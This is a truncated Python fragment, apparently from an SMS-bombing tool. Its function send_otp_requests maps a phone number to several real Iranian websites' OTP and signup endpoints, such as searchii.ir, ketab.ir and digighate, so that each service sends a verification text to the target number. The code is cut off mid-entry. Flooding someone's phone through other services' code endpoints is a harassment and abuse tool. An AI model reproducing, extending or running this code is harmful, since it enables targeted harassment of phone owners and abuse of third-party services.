def send_otp_requests(number):
    url_payload_map = {
        ...
        'searchii': ('https://searchii.ir//controler//phone_otp.php', {'mobile_number': '0' + number, 'action': 'send_otp', 'login': 'user'}),
        ...
        'hovalvakil': (f'https://api.hovalvakil.com/api/User/SendConfirmCode?userName={number}', None),
        'digighate': (f'https://api.digighate.com/v2/public/code?phone={number}', None),
        ...
        'ketabir': (f'https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=0{number}&OtpSmsType=1', None),
        ...
        'novinparse': ('https://novinparse.com/Page/PageAction.aspx', {
